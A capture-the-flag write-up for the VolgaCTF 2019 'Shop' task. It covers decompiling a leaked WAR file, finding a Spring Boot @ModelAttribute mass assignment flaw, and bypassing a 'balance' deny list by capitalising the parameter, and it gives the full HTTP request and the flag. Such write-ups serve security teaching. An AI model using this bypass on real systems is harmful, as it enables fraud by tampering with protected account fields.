Shop
====

Task description
----------------

> Our famous shop is back!
>
> http://shop.q.2019.volgactf.ru/

Solution
--------

TL;DR: Mass assignment vulnerability through ModelAttribute in Spring Boot.

This task involves a shop system where you can register accounts, sign in and
buy stuff like t-shirts, cake, and a flag. New users get 100 monetary units
as a gift afters registration. Unfortunately, the flag costs 1337 monetary
units, so we can only but t-shirts and cake.

Looking at the `/robots.txt` we see one entry `Disallow: /shop-1.0.0.war`. We
can download this war file, which contains the shop application. War files
are essentially ZIP files which contain Java bytecode and the corresponding
assets required to run the applications. After extracting the war file, you get
an directory structure, where the relevant parts are the following:

    └── WEB-INF
        ├── classes
        │   ├── applicationContext.xml
        │   ├── application.properties
        │   ├── data.sql
        │   ├── persistence.xml
        │   ├── ru
        │   │   └── volgactf
        │   │       └── shop
        │   │           ├── controllers
        │   │           │   └── ShopController.class
        │   │           ├── dao
        │   │           │   ├── ProductDao.class
        │   │           │   └── UserDao.class
        │   │           ├── filters
        │   │           │   └── AuthFilter.class
        │   │           ├── models
        │   │           │   ├── Message.class
        │   │           │   ├── Product.class
        │   │           │   └── User.class
        │   │           └── ShopApplication.class


These class files contain the Java bytecode, which is not readable source code.
However, you can still open them in IntelliJ IDEA, which ships with an
decompiler that will decompile the files before opening them. What you get is
perfectly readable Java source code. The shop application uses the Spring Boot
framework. Looking at the `ShopController.class`, we find a method named `buy`,
which handles the buying procedure of the shop.

    @Controller
    public class ShopController {
        // [...]
        @RequestMapping({"/buy"})
        public String buy(@RequestParam Integer productId, @ModelAttribute("user") User user, RedirectAttributes redir, HttpServletRequest request) {
            HttpSession session = request.getSession();
            if (session.getAttribute("user_id") == null) {
                return "redirect:index";
            } else {
                Product product = this.productDao.geProduct(productId);
                if (product != null) {
                    if (product.getPrice() <= user.getBalance()) {
                        user.setBalance(user.getBalance() - product.getPrice());
                        user.getCartItems().add(product);
                        this.userDao.update(user);
                        redir.addFlashAttribute("message", "Successful purchase");
                        return "redirect:profile";
                    }

                    redir.addFlashAttribute("message", "Not enough money");
                } else {
                    redir.addFlashAttribute("message", "Product not found");
                }

                return "redirect:index";
            }
        }

This method is annotated with an ModelAttribute annotation, referring to the
user variable, which is of type User. We can find the User class in
`User.class`. The ModelAttribute annotation allows us to set any attribute of
this user model via HTTP form data, resulting in an mass assignment
vulnerability.  The user model has several attributes, including the balance
of the user. All we have to do is to send an HTTP requests which buys the
flag and include `balance=1337` as query parameter. However, this did not
work. Turns out, that there is some code preventing us from using `balance` as
query parameter:

    @Controller
    public class ShopController {
        // [...]
        @InitBinder
        public void initBinder(WebDataBinder binder) {
            binder.setDisallowedFields(new String[]{"balance"});
        }

Thankfully, we can bypass the check by using `Balance` instead of `balance`,
which will also set the `balance` attribute of the user model. So register an
account and send the following HTTP request (with your session id) to buy the
flag:

    POST /buy?Balance=20000 HTTP/1.1
    Host: shop.q.2019.volgactf.ru
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 11
    Connection: close
    Cookie: JSESSIONID=21E66A003A3E444672C08D0D26D7F719

    productId=4

You will find the flag in your profile: VolgaCTF{c6bc0c68f0d0dac189aa9031f8607dba}.
